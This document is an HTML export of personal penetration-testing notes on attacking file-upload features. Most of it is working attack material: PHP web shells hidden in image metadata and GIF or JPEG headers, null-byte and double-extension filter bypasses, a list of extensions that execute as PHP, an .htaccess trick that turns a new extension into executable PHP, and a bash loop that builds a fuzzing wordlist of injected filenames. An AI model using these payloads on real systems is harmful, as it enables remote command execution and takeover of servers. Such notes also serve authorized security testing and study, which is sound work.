<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>27- File Upload</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>27- File Upload</h1><br/><p></p><p><h2>Attack steps</h2></p><p></p><p><div class="codebox"><pre>1. null byte exploit%00.png<br />2. image.png.php // double the extension<br />3. unusual extensions pHP <br />3. unusual extensions pHP <br />4. If they apply, the check the previous extensions. Also test them using some uppercase letters: pHp, .pHP5, .PhAr ...<br />5. file.php%00.png%00.jpg <span style="color:#ff9d00;font-weight:700">//</span> another layer <br />6. Bypass magic number check by adding at the beginning of the file the bytes of a real image <br />7. introduce the shell inside the metadata:<br /> <br /> <span style="color:#333333;font-weight:400">``` bash<br /> exiftool -Comment=&#39;&lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;&#39; random.png<br /> <br /> ```</span><br /> 7. open the file in vim and a couple lines down insert php code <br /> <br /> <span style="color:#333333;font-weight:400">```php<br /> &lt;?php echo &quot;START&lt;br/&gt;&lt;br/&gt;\n\n\n&quot;; system($_GET[&quot;cmd&quot;]); echo &quot;\n\n\n&lt;br/&gt;&lt;br/&gt;END&quot;; ?&gt;<br /> ```</span><br /> <br /></pre></div></p><p></p><p><h2>Generate png image</h2></p><p><div class="codebox"><pre><span style="color:#7f0044;font-weight:400">mx</span>=320<span style="color:#ff9d00;font-weight:700">;</span><span style="color:#7f0044;font-weight:400">my</span>=256<span style="color:#ff9d00;font-weight:700">;head</span> -c <span style="color:#3ad900;font-weight:400">&quot;$((3*mx*my))&quot;</span> /dev/urandom <span style="color:#ff9d00;font-weight:700">|</span> convert -depth 8 -size <span style="color:#3ad900;font-weight:400">&quot;${mx}x${my}&quot;</span> RGB:- random.png</pre></div></p><p><h2>GIF file upload</h2></p><p><div class="codebox"><pre>GIF89a<br /><span style="color:#333333;font-weight:400">&lt;?php</span> <br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;&lt;pre&gt;&quot;</span><span style="color:#ff9d00;font-weight:400">;</span><br />passthru<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$_GET[</span><span style="color:#3ad900;font-weight:400">&#39;cmd&#39;</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">);</span><br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;&lt;/pre&gt;&quot;</span><span style="color:#ff9d00;font-weight:400">;</span><br /><span style="color:#333333;font-weight:400">?&gt;</span><br /></pre></div></p><p></p><p><h2>PNG magic bytes  file upload</h2></p><p>Valid magic bytes for jg/jpeg <ol><li>FF D8 FF DB</li><li>FF D8 FF E0 00 10 4A 46 49 46 00 01</li><li>FF D8 FF EE</li><li>FF D8 FF E1 ?? ?? 45 78 69 66 00 00</p><p></li></ol><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># in apache doc for example a file can have multiple weak extension </span><br /><span style="color:#0088ff;font-weight:400">## if misconfigured e.g forget $ on regex in conf</span><br /> <span style="color:#ff9d00;font-weight:700">&lt;</span>FilesMatch <span style="color:#3ad900;font-weight:400">&quot;.+\.ph(ar|p|tml)&quot;</span><span style="color:#ff9d00;font-weight:700">&gt;</span><br />SetHandler application/x-httpd-php<br /><span style="color:#ff9d00;font-weight:700">&lt;/</span>FilesMatch<span style="color:#ff9d00;font-weight:700">&gt;</span> <br /><span style="color:#0088ff;font-weight:400">#exploit</span><br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&#39;FFD8FFDB&#39;</span> <span style="color:#ff9d00;font-weight:700">|</span> xxd -r -p <span style="color:#ff9d00;font-weight:700">&gt;</span> webshell.php.jpg<br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&#39;&lt;?=`$_GET[0]`?&gt;&#39;</span> <span style="color:#ff9d00;font-weight:700">&gt;&gt;</span> webshell.php.jpg</pre></div></p><p><h2>FILE extensions exploit</h2></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## extensions that allow php extensions</span><br />.php<br />.php2<br />.php3<br />.php4<br />.php5<br />.php6<br />.php7<br />.phps<br />.phps<br />.pht<br />.phtm<br />.phtml<br />.pgif<br />.shtml<br />.phar<br />.inc<br /><span style="color:#0088ff;font-weight:400">## htaccess bypass</span><br /><span style="color:#0088ff;font-weight:400">###upload .htaccess allows the creation of new extensions that will execute php</span><br /><span style="color:#0088ff;font-weight:400">### file .htaccess</span><br />AddType application/x-httpd-php .evil</pre></div></p><p></p><p><h2>Other tricks</h2><ul><li>.htaccess<ul><li><ul><li>AddType application/w-httpd-php .evil</li></ul></li></ul></li></ul></p><p></p><p></p><p></p><p><div class="codebox"><pre><span style="color:#7f0044;font-weight:400"># arbitrary file upload </span><br /><span style="color:#7f0044;font-weight:400">## find extension : wappalyzer / index.ext </span><br />/opt/useful/seclists/Web-Shells<br />&lt;?php system($_REQUEST[<span style="color:#0088ff;font-weight:400">&#39;cmd&#39;</span>]); ?&gt;<br /><span style="color:#7f0044;font-weight:400">## https://github.com/pentestmonkey/php-reverse-shell</span><br /><span style="color:#7f0044;font-weight:400"># disable front(-end </span><br />e.g <span style="color:#7f0044;font-weight:400">&lt;input</span> <span style="color:#333333;font-weight:400">type=</span><span style="color:#3ad900;font-weight:400">&quot;file&quot;</span> <span style="color:#333333;font-weight:400">xxx</span> <span style="color:#333333;font-weight:400">accept=</span><span style="color:#3ad900;font-weight:400">&quot;.php&quot;</span><span style="color:#7f0044;font-weight:400">&gt;</span><br /><span style="color:#7f0044;font-weight:400">## blacklist bypass (fuzzing extensions)</span><br /><br /><span style="color:#7f0044;font-weight:400"># code for whitelist bypass via character injection</span><br /><span style="color:#7f0044;font-weight:400">## e.g windows IIS shell.jpg:.aspx</span><br /><span style="color:#7f0044;font-weight:400">## e.g PHP apache shell.php%00.jpg (versions earlier then 5.x </span><br />for char in &#39;%20&#39; &#39;%0a&#39; &#39;%00&#39; &#39;%0d0a&#39; &#39;/&#39; &#39;.<span style="color:#333333;font-weight:400">\\</span>&#39; &#39;.&#39; &#39;â€¦&#39; &#39;:&#39;; do<br />	for ext in &#39;.php&#39; &#39;.phps&#39;; do<br />		<span style="color:#333333;font-weight:400">echo &quot;shell$char$ext.jpg&quot; &gt;&gt; wordlist.txt</span><br />		<span style="color:#333333;font-weight:400">echo &quot;shell$ext$char.jpg&quot; &gt;&gt; wordlist.txt</span><br />		<span style="color:#333333;font-weight:400">echo &quot;shell.jpg$char$ext&quot; &gt;&gt; wordlist.txt</span><br />		<span style="color:#333333;font-weight:400">echo &quot;shell.jpg$ext$char&quot; &gt;&gt; wordlist.txt</span><br />	done<br />done</pre></div></p><p></p><p></p><p><h2>Blacklist bypass fuzzing</h2></p><p></p><p><img src="images/402-1.png" alt="images/402-1.png" /></p><p><ul><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files</a></li><li>double extensions (exploit regex pbs in source code or infrastructure)</li><li></li></ul><img src="images/402-2.png" alt="images/402-2.png" /></p><p></p><p></p><p></p><p><h2>Type filters</h2></p></div>
</body>
</html>
